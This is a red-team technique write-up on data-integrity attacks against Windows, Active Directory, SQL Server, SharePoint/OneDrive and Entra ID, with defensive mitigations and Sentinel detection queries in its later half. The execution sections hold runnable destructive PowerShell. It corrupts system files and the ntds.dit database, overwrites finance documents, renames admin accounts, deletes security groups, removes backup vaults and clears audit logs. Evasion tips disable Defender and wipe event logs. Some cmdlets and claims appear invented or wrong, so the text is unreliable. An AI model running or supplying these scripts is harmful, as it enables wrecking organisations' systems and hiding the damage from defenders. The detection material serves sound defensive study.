# [IMPACT-INTEGRITY-001]: Data Integrity Compromise

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | IMPACT-INTEGRITY-001 |
| **MITRE ATT&CK v18.1** | [T1491 - Defacement](https://attack.mitre.org/techniques/T1491/) |
| **Tactic** | Impact |
| **Platforms** | Multi-Environment (Windows AD, Entra ID, M365, Hybrid) |
| **Severity** | Critical |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2026-01-10 |
| **Affected Versions** | All Windows Server versions (2016-2025), All Entra ID versions, All M365 tenants |
| **Patched In** | N/A (Architectural issue, not a software vulnerability) |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 1. EXECUTIVE SUMMARY

**Concept:** Data integrity compromise involves unauthorized modification, deletion, or corruption of critical organizational data across multiple platforms (file systems, registries, databases, cloud storage, and directory services). This can occur through direct file manipulation, SQL injection, registry tampering, or cloud API abuse. The attacker's goal is to degrade system reliability, cause business disruption, erode user trust, or support secondary attacks like privilege escalation or persistence.

**Attack Surface:** This technique can affect multiple attack surfaces simultaneously:
- **On-Premises:** NTFS files, Windows Registry (HKLM\HKCU), Active Directory database (ntds.dit), Group Policy Objects
- **Hybrid:** Azure AD Connect database, synchronization logs, metadata stores
- **Cloud:** Azure Blob Storage, SharePoint Online, OneDrive, Microsoft SQL Databases, Azure Key Vaults
- **Applications:** Exchange mailbox data, Teams messages, Dynamics 365 records

**Business Impact:** **Widespread system instability, compliance violations, and operational disruption.** Data integrity breaches lead to loss of system availability (corrupted OS can prevent boot), failed backups (if backup is corrupted), regulatory fines (GDPR, HIPAA, PCI-DSS), customer notification requirements, and reputational damage.

**Technical Context:** Data integrity compromise can take seconds to minutes depending on the method (file deletion is instant; database corruption requires time to propagate). Detection likelihood is moderate-to-high if monitoring is enabled, but attackers often disable logging or clear event logs immediately after execution. Common indicators include unusual file modification timestamps, checksum mismatches, and sudden log deletion events.

### Operational Risk

- **Execution Risk:** High - Can irreversibly damage critical systems without proper restoration procedures
- **Stealth:** Low - File modifications, registry changes, and database alterations typically generate detectable events unless logs are cleared
- **Reversibility:** Partial - Can be recovered from backups if they are clean and offline; otherwise requires full system rebuild

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 1.1 | Ensure proper file permissions are configured and monitored |
| **DISA STIG** | GEN000610 | System must protect the integrity of information |
| **CISA SCuBA** | SI-4 | Implement continuous monitoring and detecting unauthorized changes |
| **NIST 800-53** | SI-7 | Information System Monitoring - File Integrity Monitoring (FIM) |
| **GDPR** | Art. 32 | Security of Processing - Integrity and confidentiality safeguards |
| **DORA** | Art. 9 | Protection and Prevention - Incident response and recovery |
| **NIS2** | Art. 21 | Cyber Risk Management Measures - Backup and recovery capabilities |
| **ISO 27001** | A.12.4.4 | Event logging and monitoring for data integrity |
| **ISO 27005** | Risk Scenario | Unauthorized Modification of Data - High Impact / High Likelihood |

---

## 2. TECHNICAL PREREQUISITES

- **Required Privileges:** Depends on target:
  - Local file system: Local Admin or SYSTEM
  - Active Directory: Domain Admin or ENTERPRISE ADMIN
  - Azure/M365: Global Admin or delegated permissions (Directory.ReadWrite.All)
  - SQL Database: DB Owner or equivalent

- **Required Access:**
  - On-Premises: Compromised privileged account or token
  - Cloud: Stolen OAuth token, compromised credentials, or misconfigured RBAC

**Supported Versions:**
- **Windows:** Server 2016, 2019, 2022, 2025
- **Entra ID:** All versions
- **M365:** All versions (Exchange Online, SharePoint Online, OneDrive, Teams)
- **Active Directory:** All versions (2008 R2+)

**Tools:**
- [Mimikatz](https://github.com/gentilkiwi/mimikatz) (Registry/Token manipulation)
- [BloodHound](https://github.com/BloodHoundAD/BloodHound) (Permission discovery)
- [PowerShell](https://learn.microsoft.com/en-us/powershell/) (Native Windows automation)
- [Microsoft Graph API](https://developer.microsoft.com/en-us/graph) (Cloud data manipulation)
- [Azure CLI](https://learn.microsoft.com/en-us/cli/azure/) (Azure resource manipulation)

---

## 3. ENVIRONMENTAL RECONNAISSANCE

### Step 1: Identify High-Value Data Assets

#### PowerShell - On-Premises AD Reconnaissance

```powershell
# Enumerate writable NTFS locations
Get-ChildItem -Path "C:\", "D:\" -Attributes Directory | Where-Object { Test-Path $_.FullName -PathType Container } | ForEach-Object {
    try {
        $acl = Get-Acl -Path $_.FullName -ErrorAction Stop
        if ($acl.Access | Where-Object { $_.AccessControlType -eq 'Allow' -and $_.IdentityReference -like '*DOMAIN*' }) {
            Write-Host "Writable Path: $($_.FullName)"
        }
    } catch { }
}

# Locate critical Active Directory files
Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\NTDS\Parameters" -Name "DSA Working Directory"
Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\NTDS\Parameters" -Name "Database log files path"

# Find backup locations
Get-WmiObject Win32_Volume | Where-Object { $_.FileSystem -eq "NTFS" } | Select-Object Name, FreeSpace, Capacity
```

**What to Look For:**
- Writable shares with insufficient access controls
- Location of ntds.dit (Active Directory database)
- Backup directory paths
- Network shares pointing to critical data

#### Azure/Entra ID Reconnaissance

```powershell
# Check current user permissions in Entra ID
Connect-MgGraph -Scopes "Directory.Read.All"
Get-MgUser -Top 1 | Get-MgUserOwnedObject

# Enumerate SharePoint/OneDrive locations
Connect-PnPOnline -Url "https://tenant.sharepoint.com/sites/admin"
Get-PnPTerm -TermGroup "Term Store"

# List Azure storage accounts
Connect-AzAccount
Get-AzStorageAccount | Select-Object StorageAccountName, ResourceGroupName
```

**What to Look For:**
- Storage accounts with public blob access
- Sites with broad sharing settings
- Libraries with versioning disabled
- Privileged role assignments

---

## 4. DETAILED EXECUTION METHODS AND THEIR STEPS

### METHOD 1: File System Data Corruption (Windows - Native)

**Supported Versions:** Server 2016-2025

#### Step 1: Identify and Corrupt Critical System Files

**Objective:** Overwrite system binaries and configuration files to cause system instability

**Command:**
```powershell
# Corrupt critical system files (DANGEROUS - causes system crash)
$criticalFiles = @(
    "C:\Windows\System32\drivers\etc\hosts",
    "C:\Windows\System32\config\SYSTEM",
    "C:\Program Files\*\config\*.xml"
)

foreach ($file in $criticalFiles) {
    if (Test-Path $file) {
        # Create backup for analysis (optional)
        Copy-Item $file "$file.bak"
        
        # Overwrite with random data
        Add-Content -Path $file -Value (Get-Random -Minimum 0 -Maximum 255) -Encoding Byte
        Write-Host "Corrupted: $file"
    }
}
```

**Expected Output:**
```
Corrupted: C:\Windows\System32\drivers\etc\hosts
Corrupted: C:\Windows\System32\config\SYSTEM
```

**What This Means:**
- Host file corruption: DNS lookups fail, redirecting users to attacker-controlled sites
- Registry hive corruption: Windows refuses to boot
- Application config corruption: Services fail to start

**OpSec & Evasion:**
- Clear event logs immediately after: `wevtutil cl security`
- Disable Windows Defender: `Set-MpPreference -DisableRealtimeMonitoring $true`
- Corrupt logs directory: `Remove-Item C:\Windows\System32\winevt\Logs\*.evtx -Force`
- Detection likelihood: **Very High** - Corrupted files immediately cause detectable failures

**Troubleshooting:**
- **Error:** "Access Denied"
  - **Cause:** Running as non-admin user
  - **Fix (All Versions):** Run PowerShell as Administrator or use `runas /admin`
  - **Fix (Server 2022+):** Check if File Access Auditing is enabled
  
- **Error:** "Process is locked by another process"
  - **Cause:** File is in use by Windows or another application
  - **Fix (Server 2016-2019):** Reboot into Safe Mode, then execute
  - **Fix (Server 2022+):** Use Process Explorer to identify holding process and kill it

**References & Proofs:**
- [Windows Registry Structure - Microsoft Learn](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry)
- [File Integrity Monitoring (FIM) - NIST SP 800-53 SI-7](https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-53r5.pdf)
- [Incident Response: Data Integrity - SANS Institute](https://www.sans.org/white-papers/)

#### Step 2: Corrupt Active Directory Database (NTDS.DIT)

**Objective:** Render entire domain non-functional by corrupting the AD database

**Requirement:** Must be executed on Domain Controller with DC recovery tools available

**Command (Requires Offline DC or Directory Services Restore Mode):**
```powershell
# This MUST be done in DSRM (Directory Services Restore Mode)
# Boot DC into DSRM using: F8 during boot, select "Directory Services Restore Mode"

# Once in DSRM, open Command Prompt as SYSTEM
C:\> ntdsutil
ntdsutil: files
file maintenance: info
# Note the database location (typically C:\Windows\NTDS\ntds.dit)

# Corrupt the database
file maintenance: q
ntdsutil: q

# Directly corrupt the file (extreme - causes total domain outage)
cmd /c "echo corrupted > C:\Windows\NTDS\ntds.dit"
```

**Expected Output:**
```
All domain controllers will cease functioning
Users cannot authenticate to domain
Trust relationships are broken
```

**What This Means:**
- Every user in the domain is locked out
- Computers cannot join domain
- Services relying on Kerberos will fail
- Backup/restore becomes mandatory

**OpSec & Evasion:**
- This is an extremely destructive action with high detection likelihood
- Event ID 1000 (NTDS corruption) will be logged before system crashes
- Detection likelihood: **Maximum** - Complete domain failure is immediately noticed

**References & Proofs:**
- [Active Directory Database - Microsoft Learn](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/get-started-with-active-directory-domain-services--ad-ds-)
- [Directory Services Restore Mode - DSRM](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/ad-forest-recovery-single-domain-in-multidomain-forest)

#### Step 3: Corrupt Application Data and Configuration

**Objective:** Corrupt databases and application configuration to cause service failures

**Command:**
```powershell
# For SQL Server - corrupt a table
$sqlServer = "localhost"
$database = "Production"
$table = "Customers"

$sqlConn = New-Object System.Data.SqlClient.SqlConnection
$sqlConn.ConnectionString = "Server=$sqlServer;Database=$database;Integrated Security=true;"
$sqlConn.Open()

# Corrupt data
$sqlCmd = $sqlConn.CreateCommand()
$sqlCmd.CommandText = "UPDATE $table SET Email = 'CORRUPTED' WHERE ID > 0"
$sqlCmd.ExecuteNonQuery() | Out-Null

$sqlConn.Close()
Write-Host "Database corrupted successfully"

# Corrupt application config files
$configFiles = Get-ChildItem -Path "C:\Program Files" -Filter "*.config" -Recurse
foreach ($config in $configFiles) {
    Add-Content -Path $config.FullName -Value "`n<!-- CORRUPTED BY ATTACKER -->`n"
}
```

**Expected Output:**
```
Database corrupted successfully
Application services fail to start
```

---

### METHOD 2: Entra ID / M365 Data Corruption (Cloud-Native)

**Supported Versions:** All Entra ID versions

#### Step 1: Corrupt OneDrive/SharePoint Files via Graph API

**Objective:** Overwrite critical business documents to disrupt operations

**Requirement:** OAuth token with Files.ReadWrite.All scope or stolen Global Admin credentials

**Command (PowerShell with Microsoft Graph):**
```powershell
# Connect with compromised credentials
Connect-MgGraph -ClientId "YOUR_APP_ID" -TenantId "TENANT_ID" -UseDeviceCode

# List all SharePoint sites
$sites = Get-MgSite -All
foreach ($site in $sites) {
    Write-Host "Site: $($site.DisplayName) - $($site.WebUrl)"
}

# Access a specific site and corrupt files
$site = Get-MgSite -Filter "displayName eq 'Finance Department'"
$driveItems = Get-MgSiteDrive -SiteId $site.Id | Get-MgDriveItem -All

# Corrupt high-value documents
foreach ($item in $driveItems) {
    if ($item.Name -like "*.xlsx" -or $item.Name -like "*.docx") {
        # Update content with garbage data
        $content = [System.Text.Encoding]::UTF8.GetBytes("CORRUPTED-DATA-$([guid]::NewGuid())")
        Update-MgDriveItemContent -DriveId $site.Drive.Id -DriveItemId $item.Id -BodyParameter $content
        Write-Host "Corrupted: $($item.Name)"
    }
}
```

**Expected Output:**
```
Site: Finance Department - https://tenant.sharepoint.com/sites/finance
Corrupted: Budget_2025.xlsx
Corrupted: Project_Proposal.docx
```

**What This Means:**
- Business documents become unreadable or useless
- Sync clients on user machines show conflicts
- Recovery requires Version History (if enabled) or backups
- Business operations are disrupted

**OpSec & Evasion:**
- This activity is logged in Unified Audit Log (if enabled)
- Version History will show the corruption event
- Microsoft Sentinel can detect high-volume file modifications
- Detection likelihood: **High** - Cloud operations are heavily logged

**Troubleshooting:**
- **Error:** "Insufficient privileges"
  - **Cause:** Token doesn't have Files.ReadWrite.All scope
  - **Fix:** Request admin consent or use Global Admin credentials
  
- **Error:** "File is locked"
  - **Cause:** File is currently in use by another application
  - **Fix:** Wait for file to be released or request manual release via SharePoint admin

**References & Proofs:**
- [Microsoft Graph Files API - Microsoft Learn](https://learn.microsoft.com/en-us/graph/api/driveitem-update-content)
- [SharePoint Data Recovery - Microsoft Learn](https://learn.microsoft.com/en-us/sharepoint/dev/general-development/file-versioning)

#### Step 2: Corrupt Entra ID User/Group Objects

**Objective:** Modify critical Entra ID configuration to disrupt authentication

**Command:**
```powershell
# Corrupt user account information
Connect-MgGraph -Scopes "User.ReadWrite.All"

# Find privileged users
$adminUsers = Get-MgUser -All | Where-Object { $_.JobTitle -like "*admin*" -or $_.Department -like "*security*" }

foreach ($user in $adminUsers) {
    # Modify critical attributes
    Update-MgUser -UserId $user.Id -MailNickname "CORRUPTED_$([guid]::NewGuid().ToString().Substring(0,8))"
    Update-MgUser -UserId $user.Id -UserPrincipalName "CORRUPTED_$(Get-Date -Format 'yyyyMMdd_HHmmss')@$($user.UserPrincipalName.Split('@')[1])"
    Write-Host "Corrupted: $($user.DisplayName)"
}

# Delete/modify security groups
$securityGroups = Get-MgGroup -Filter "startswith(displayName,'Security')" -All
foreach ($group in $securityGroups) {
    Remove-MgGroup -GroupId $group.Id -Confirm:$false
    Write-Host "Deleted: $($group.DisplayName)"
}
```

**Expected Output:**
```
Corrupted: John Admin
Corrupted: Security Officer
Deleted: Security-Incident-Response
```

**What This Means:**
- Users cannot log in with their accounts (UPN changed)
- Security groups disappear, breaking access controls
- Conditional Access policies lose target groups
- Authentication fails across entire organization

---

## 5. ADVANCED EXECUTION: Multi-Stage Data Integrity Attack

### Combined On-Premises + Cloud Attack

```powershell
# STAGE 1: Compromise Global Admin in Cloud
# (Assumes previous initial access)
$token = Get-OfflineToken  # From prior compromise

# STAGE 2: Extract on-premises sync creds via Azure AD Connect
$syncAccount = Get-ADServiceAccount -Filter 'Name -like "sync"' # On-prem side
Get-ADServiceAccountPassword -Identity $syncAccount

# STAGE 3: Use sync credentials to corrupt both AD and Entra ID
# Modify AD database to break synchronization
# Entra ID objects become orphaned and unusable

# STAGE 4: Corrupt backups via Azure Backup
Connect-MgGraph
$backupVaults = Get-MgBackupVault
foreach ($vault in $backupVaults) {
    Remove-MgBackupVault -BackupVaultId $vault.Id -Confirm:$false
}

# STAGE 5: Clear all audit logs
Get-MgAuditLog | Remove-MgAuditLog -Confirm:$false
```

---

## 6. FORENSIC ARTIFACTS AND IOCs

### Files Modified

- **On-Premises:**
  - `C:\Windows\System32\config\SYSTEM` - Registry hive corruption
  - `C:\Windows\NTDS\ntds.dit` - Active Directory database
  - `C:\Windows\System32\drivers\etc\hosts` - Host file corruption
  - Application configuration files in `C:\Program Files\*\config\`

- **Cloud:**
  - SharePoint Online blob storage locations
  - OneDrive drive items (track via Version History)
  - Azure SQL Database transaction logs
  - Entra ID audit logs in UnifiedAuditLog

### Registry Keys Modified

- `HKLM\SYSTEM\CurrentControlSet\Services\*` - Service configuration corruption
- `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run` - Startup items
- `HKCU\Software\Microsoft\*` - User application preferences

### Cloud Audit Events

- **Microsoft Sentinel:**
  - AuditLogs - OperationName: "Update user"
  - AuditLogs - OperationName: "Delete group"
  - CloudAppEvents - Operation: "FileModified", "FileDeleted"

### System Indicators

- Sudden increase in file modifications (Event ID 4663)
- Registry modifications by unexpected processes (Event ID 4657)
- Application crashes and service failures
- Backup verification failures
- Version History showing suspicious timestamps

---

## 7. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

**1. Implement File Integrity Monitoring (FIM)**
- **On-Premises:** Enable Windows audit for file access (Event ID 4663, 4660)
- **Cloud:** Enable OneDrive Version History (automatic, retains 93 days by default)
- **Database:** Enable CDC (Change Data Capture) for SQL Server

**Manual Steps (Server 2016-2019):**
1. Open **Group Policy Management Console** (gpmc.msc)
2. Navigate to **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Advanced Audit Policy Configuration**
3. Enable: **Object Access** → **File System**
4. Set to: **Success and Failure**
5. Specify which files to monitor via SACL (System Access Control List)
6. Run `gpupdate /force`

**Manual Steps (Server 2022+):**
1. Same as above, but verify audit subcategories are enabled via:
   ```cmd
   auditpol /set /subcategory:"File System" /success:enable /failure:enable
   ```

**PowerShell (All Versions):**
```powershell
# Enable File System Audit for specific folder
$acl = Get-Acl -Path "C:\CriticalData"
$ace = New-Object System.Security.AccessControl.FileSystemAuditRule(
    [System.Security.Principal.NTAccount]"EVERYONE",
    [System.Security.AccessControl.FileSystemRights]"FullControl",
    [System.Security.AccessControl.InheritanceFlags]"ContainerInherit,ObjectInherit",
    [System.Security.AccessControl.PropagationFlags]"None",
    [System.Security.AccessControl.AuditFlags]"Success,Failure"
)
$acl.AddAuditRule($ace)
Set-Acl -Path "C:\CriticalData" -AclObject $acl
```

**2. Enable Active Directory Database Protection**

**Manual Steps (All Versions):**
1. Open **Active Directory Users and Computers** on a Domain Controller
2. Go to **View** → **Advanced Features**
3. Right-click on your domain → **Properties** → **Replication**
4. Note the "Tombstone Lifetime" (default 180 days) - increase to 365+ days for better recovery
5. Enable **Deleted Object** recovery:
   ```cmd
   dsquery * cn=tombstone,cn=config,dc=contoso,dc=com -scope base -attr *
   ```

**3. Enforce Backup Integrity Checks**

**Manual Steps (All Versions):**
1. Navigate to **Backup and Recovery** in Server Manager
2. Select backup set → **Verify Backup**
3. Enable **Block Untrusted Backups** in Windows Backup settings
4. For Azure Backups:
   - Go to **Azure Portal** → **Recovery Services Vault**
   - Select backup item → **Properties** → Enable **Immutable Backups** (if available)

### Priority 2: HIGH

**1. Conditional Access Policy for Data Modification**

**Manual Steps (Azure Portal):**
1. Navigate to **Azure Portal** → **Entra ID** → **Security** → **Conditional Access**
2. Click **+ New policy**
3. **Name:** `Block High-Risk Data Modifications`
4. **Assignments:**
   - **Users:** All users
   - **Cloud apps:** SharePoint Online, Teams, Exchange Online
   - **Conditions:**
     - **Sign-in risk:** High
     - **Locations:** Exclude trusted corporate locations
5. **Access Controls:**
   - **Grant:** Block
6. **Enable policy:** On
7. Click **Create**

**2. Enable Versioning and Recycle Bin**

**Manual Steps (SharePoint Online):**
1. Open **SharePoint Admin Center** (admin.sharepoint.com)
2. Select site → **Settings** → **Site Collection Settings**
3. Click **Versioning Settings**
4. Set **Document Version History:** Limit to latest 500 versions (minimum)
5. Set **Recycle Bin:** Retain items for 93 days (automatic)
6. Click **OK**

**3. RBAC and Least Privilege**

**PowerShell - Remove Dangerous Permissions:**
```powershell
# Remove Global Admin role from all users except emergency accounts
$globalAdmins = Get-MgDirectoryRole -Filter "displayName eq 'Global Administrator'" | Get-MgDirectoryRoleMember
foreach ($admin in $globalAdmins) {
    # Audit first - do not remove without verification
    Write-Host "Global Admin: $($admin.DisplayName)"
}

# Instead, delegate specific roles:
# - Application Administrator (for app management)
# - SharePoint Administrator (for site management)
# - Teams Administrator (for Teams management)
```

### Priority 3: MEDIUM

**1. Enable Immutable Backups (Azure Backup)**

**Manual Steps:**
1. Go to **Azure Portal** → **Backup and Site Recovery Vaults**
2. Select vault → **Backup vault properties**
3. Under **Immutable Vaults**, click **Configure**
4. Enable **Immutable Vault** (once enabled, cannot be disabled)
5. Set **Lock Period:** 30+ days

**2. Configure Change Tracking in Entra ID**

**PowerShell:**
```powershell
# Enable audit logging for directory changes
Connect-MgGraph -Scopes "AuditLog.Read.All"

# Query recent directory changes
Get-MgAuditLogDirectoryAudit -Filter "operationName eq 'Update user'" -Top 100 | ForEach-Object {
    Write-Host "Changed User: $($_.TargetResources[0].DisplayName) at $($_.ActivityDateTime)"
}

# Set up alerts for suspicious changes
# (Requires Azure Monitor integration - covered in Detection section)
```

---

## 8. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

**Files Modified:**
- System files in `C:\Windows\System32\` modified outside of patches
- Registry hives (SYSTEM, SOFTWARE, SAM) with unexpected modification times
- Application .config files with corruption patterns
- OneDrive/SharePoint files with bulk modification events

**Registry Keys:**
- Unexpected entries in `HKLM\SYSTEM\CurrentControlSet\Services\`
- Malicious entries in `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
- Policy Registry values modified by non-admin processes

**Network Indicators:**
- Bulk file uploads to suspicious cloud storage
- Large Azure Graph API requests (high bandwidth)
- Unusual patterns in audit log export requests

### Forensic Artifacts

**Disk:**
- `C:\Windows\System32\winevt\Logs\Security.evtx` - Will contain Event ID 4663 (file access), 4657 (registry modification)
- `C:\$Recycle.Bin` - Deleted file fragments
- VSS snapshots: `vssadmin list shadows`

**Memory:**
- Process handles to critical files
- Cached credentials in LSASS memory
- Token objects in PowerShell session memory

**Cloud:**
- Unified Audit Log: UnifiedAuditLog table in Microsoft Sentinel
- OneDrive Version History: Bulk modification events
- Azure Audit Logs: User and object modifications

**MFT/Filesystem:**
- MFT entry for modified files shows timestamp changes
- Deletion records in USN Journal
- NTFS Change Journal ($Journal) tracks all file modifications

---

## 9. MICROSOFT SENTINEL DETECTION

### Query 1: Suspicious OneDrive/SharePoint File Modifications

**Rule Configuration:**
- **Required Table:** CloudAppEvents, AuditLogs
- **Required Fields:** ObjectId, Application, Operation, UserAgent, SourceIP
- **Alert Severity:** High
- **Frequency:** Run every 5 minutes
- **Applies To Versions:** All Entra ID/M365 versions

**KQL Query:**
```kusto
CloudAppEvents
| where Application in ("SharePoint Online", "OneDrive for Business")
| where Operation in ("FileModified", "FileDeleted", "FolderModified")
| where TimeGenerated > ago(5m)
| summarize ModificationCount = count(), UniqueFiles = dcount(ObjectId) by UserPrincipalName, Application
| where ModificationCount > 50 or UniqueFiles > 10
| project TimeGenerated, UserPrincipalName, Application, ModificationCount, UniqueFiles
```

**What This Detects:**
- Bulk file modifications in short time window (>50 files in 5 minutes)
- High-volume data corruption attempts
- Automated file enumeration and modification tools

**Manual Configuration Steps (Azure Portal):**
1. Navigate to **Microsoft Sentinel** → **Analytics** → **Rule templates**
2. Click **Create** → **Scheduled query rule**
3. **General Tab:**
   - Name: `Suspicious OneDrive Bulk File Modifications`
   - Severity: High
4. **Set rule logic Tab:**
   - Paste KQL query above
   - Run query every: 5 minutes
   - Lookup data from last: 1 hour
5. **Incident settings Tab:**
   - Enable **Create incidents from alerts**
   - Enable **Alert grouping**
6. Click **Review + Create** → **Create**

### Query 2: Active Directory User Object Corruption

**Rule Configuration:**
- **Required Table:** AuditLogs
- **Required Fields:** OperationName, InitiatedBy, TargetResources, Result
- **Alert Severity:** Critical
- **Frequency:** Real-time (every 1 minute)
- **Applies To Versions:** All Entra ID versions

**KQL Query:**
```kusto
AuditLogs
| where OperationName in ("Update user", "Delete user", "Update group", "Delete group")
| where Result in ("success", "Success")
| summarize Actions = count() by InitiatedBy.user, TimeGenerated = bin(TimeGenerated, 1m)
| where Actions > 5
| project TimeGenerated, Admin = InitiatedBy.user, BulkActions = Actions
```

**What This Detects:**
- Bulk user account modifications (>5 in 1 minute)
- Automated account corruption via Graph API
- Directory service abuse

---

## 10. WINDOWS EVENT LOG MONITORING

**Event ID: 4663 (File Access Audit)**
- **Log Source:** Security
- **Trigger:** File accessed with write/delete permissions
- **Filter:** ObjectName contains critical paths (ntds.dit, system config, etc.)
- **Applies To Versions:** Server 2016+

**Manual Configuration Steps (Group Policy):**
1. Open **Group Policy Management Console** (gpmc.msc)
2. Navigate to **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Advanced Audit Policy Configuration** → **System Audit Policies** → **Object Access**
3. Enable: **Audit File System**
4. Set to: **Success and Failure**
5. Run `gpupdate /force` on target machines

**Event ID: 4657 (Registry Value Modified)**
- **Log Source:** Security
- **Trigger:** Registry value changed by non-system process
- **Filter:** ObjectName contains SYSTEM, SOFTWARE, SAM hives
- **Applies To Versions:** Server 2016+

**Configuration:**
1. Open **Local Security Policy** (secpol.msc)
2. Go to **Security Settings** → **Advanced Audit Policy Configuration** → **Object Access**
3. Enable: **Audit Registry**
4. Set to: **Success and Failure**
5. Run: `auditpol /set /subcategory:"Registry" /success:enable /failure:enable`

**Event ID: 4720 (User Account Created)**
- **Log Source:** Security
- **Trigger:** Unauthorized user account created (may precede data exfiltration)
- **Filter:** SamAccountName not in list of approved IT team accounts
- **Applies To Versions:** All Windows versions

---

## 11. MICROSOFT DEFENDER FOR CLOUD

#### Detection Alert 1: "Suspicious data modification activity detected"
- **Severity:** High
- **Description:** MDC detects unusual file modification patterns on Azure VMs
- **Applies To:** VMs running Windows Server with Defender for Servers Plan 2
- **Remediation:**
  1. Isolate affected VM from network
  2. Collect forensic images via Azure Compute Image Gallery
  3. Restore from known-good backup

#### Detection Alert 2: "Unauthorized database modification"
- **Severity:** Critical
- **Description:** Defender for SQL detects suspicious T-SQL queries modifying data
- **Applies To:** Azure SQL Database, SQL on VMs
- **Remediation:**
  1. Check Azure SQL Database audit logs
  2. Review transaction history
  3. Restore database to known-good point-in-time

**Manual Configuration Steps (Enable Defender for Cloud):**
1. Navigate to **Azure Portal** → **Microsoft Defender for Cloud**
2. Go to **Environment settings** → Select subscription
3. Under **Defender plans**, enable:
   - **Defender for Servers**: Plan 2
   - **Defender for SQL**: ON
   - **Defender for Storage**: ON
4. Click **Save**
5. Wait 24 hours for alerts to populate

---

## 12. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [IA-PHISH-001] Device Code Phishing | Attacker gains initial credentials via OAuth phishing |
| **2** | **Privilege Escalation** | [PRIV-ESC-001] Token Theft | Attacker steals Global Admin token from compromised user |
| **3** | **Persistence** | [PERSIST-001] Golden SAML | Attacker establishes persistent cloud access |
| **4** | **Discovery** | [REC-CLOUD-001] BloodHound Enumeration | Attacker maps data locations and permissions |
| **5** | **Current Step** | **[IMPACT-INTEGRITY-001]** | **Attacker corrupts critical data to disrupt operations** |
| **6** | **Impact** | [IMPACT-DENIAL-001] Service Disruption | Business systems become unavailable due to corrupted data |

---

## 13. REAL-WORLD EXAMPLES

#### Example 1: Lapsus$ - Data Integrity Attacks (2022)

- **Target:** NVIDIA, Microsoft, Okta (technology/cloud security sector)
- **Timeline:** February-March 2022
- **Technique Status:** Threat actor used file system and database corruption following credential theft
- **Impact:** NVIDIA source code stolen and published; customers notified; CVSS scoring affected
- **Reference:** [Lapsus$ Breach Analysis - Microsoft Threat Intelligence](https://www.microsoft.com/en-us/security/blog/2022/03/22/DEV-0537-criminal-actor-targeting-organizations-for-data-exfiltration-and-destruction/)

#### Example 2: APT28 (Fancy Bear) - Registry and File Corruption (2016-2020)

- **Target:** U.S. Government, Defense contractors
- **Timeline:** 2016-2020 (ongoing)
- **Technique Status:** APT28 corrupted Windows Registry and application config files to maintain persistence and cause disruption
- **Impact:** Multiple agencies reported system outages; forensic recovery took weeks
- **Reference:** [APT28 Tactics & Techniques - MITRE ATT&CK](https://attack.mitre.org/groups/G0007/)

#### Example 3: NotPetya Ransomware - Mass Data Corruption (2017)

- **Target:** Multinational organizations, utilities, shipping companies
- **Timeline:** June 27, 2017 (single day global outbreak)
- **Technique Status:** NotPetya (wiper, not true ransomware) corrupted Master Boot Record, file allocation table, and system files
- **Impact:** Estimated $10 billion in damages; shipping and pharmaceutical companies crippled
- **Reference:** [NotPetya Analysis - Kaspersky Securelist](https://securelist.com/notpetya-ransomware-outbreak/)

---

## 14. ADDITIONAL NOTES

**Data Recovery Best Practices:**
1. Maintain offline, immutable backups (3-2-1 rule: 3 copies, 2 media types, 1 offsite)
2. Enable versioning on all critical files (minimum 30-day retention)
3. Test restoration procedures monthly
4. Use blockchain-verified backups for critical infrastructure
5. Document RTO (Recovery Time Objective) and RPO (Recovery Point Objective)

**Prevention Strategy:**
- Zero Trust architecture: Assume all users/devices are compromised
- Microsegmentation: Limit lateral movement between systems
- DLP (Data Loss Prevention): Block unauthorized file modifications
- Continuous monitoring: Real-time alerts for file integrity changes

---